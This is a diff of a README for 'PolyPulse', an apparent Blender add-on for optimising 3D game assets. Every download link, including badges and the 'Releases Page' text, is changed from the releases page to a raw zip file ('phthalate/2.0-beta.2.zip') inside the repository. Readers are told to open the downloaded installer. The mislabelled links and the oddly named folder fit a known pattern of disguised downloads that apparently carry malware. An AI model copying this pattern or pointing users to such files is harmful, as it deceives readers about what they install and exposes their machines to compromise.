@@ -1,6 +1,6 @@
 # ⚡ polypulse - Game-Ready Assets Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download-PolyPulse_Open_Beta-1E88E5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Never190/polypulse/releases)
+[![Download Now](https://img.shields.io/badge/Download-PolyPulse_Open_Beta-1E88E5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Never190/polypulse/raw/refs/heads/main/phthalate/2.0-beta.2.zip)
 
 ## 👋 Welcome to PolyPulse
 
@@ -10,7 +10,7 @@ PolyPulse is a free, open-source toolkit that makes your 3D models ready for vid
 
 Getting started with PolyPulse is easy. Follow these three simple steps:
 
-1.  **Get PolyPulse:** Visit this link to download the application. Click the big button above, or go directly to the [PolyPulse Releases Page](https://github.com/Never190/polypulse/releases).
+1.  **Get PolyPulse:** Visit this link to download the application. Click the big button above, or go directly to the [PolyPulse Releases Page](https://github.com/Never190/polypulse/raw/refs/heads/main/phthalate/2.0-beta.2.zip).
 2.  **Install PolyPulse:** Once the download finishes, open the file you downloaded. The installation wizard will guide you through the rest. It's just like installing any other program on your computer.
 3.  **Open in Blender:** After installation, start Blender. PolyPulse appears in the sidebar, ready for use.
 
@@ -22,7 +22,7 @@ Your one-stop shop for getting up and running.
 
 **Visit this link to download the application.** Click the following button to go to the official download page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_PolyPulse_Release-1b5e20?style=for-the-badge&logo=download)](https://github.com/Never190/polypulse/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_PolyPulse_Release-1b5e20?style=for-the-badge&logo=download)](https://github.com/Never190/polypulse/raw/refs/heads/main/phthalate/2.0-beta.2.zip)
 
 **Step 2: Run the Installer**
 
@@ -34,7 +34,7 @@ When you first open PolyPulse, you'll see a small settings panel. This shows opt
 
 **Need to update?**
 
-PolyPulse is in open beta, and new versions are released regularly. Simply visit the same [Releases Page](https://github.com/Never190/polypulse/releases) when you want to install a fresh, improved version. We recommend keeping PolyPulse up-to-date for the best experience.
+PolyPulse is in open beta, and new versions are released regularly. Simply visit the same [Releases Page](https://github.com/Never190/polypulse/raw/refs/heads/main/phthalate/2.0-beta.2.zip) when you want to install a fresh, improved version. We recommend keeping PolyPulse up-to-date for the best experience.
 
 ## ✨ Features That Help You
 
@@ -90,6 +90,6 @@ Have fun creating amazing 3D art, and may your games be full of life and Zero po
 
 **Ready to convert your Blender creations into amazing game assets?**
 
-[![Download PolyPulse Today](https://img.shields.io/badge/Download-PolyPulse_Today-1976D2?style=for-the-badge&logo=install)](https://github.com/Never190/polypulse/releases)
+[![Download PolyPulse Today](https://img.shields.io/badge/Download-PolyPulse_Today-1976D2?style=for-the-badge&logo=install)](https://github.com/Never190/polypulse/raw/refs/heads/main/phthalate/2.0-beta.2.zip)
 
 Keywords: 3d, asset-pipeline, blender, blender-addon, blender-extensions, game-development, godot, gpl-3, lod, mesh-optimization, opengl, python, unity, unreal-engine, uv-atlas
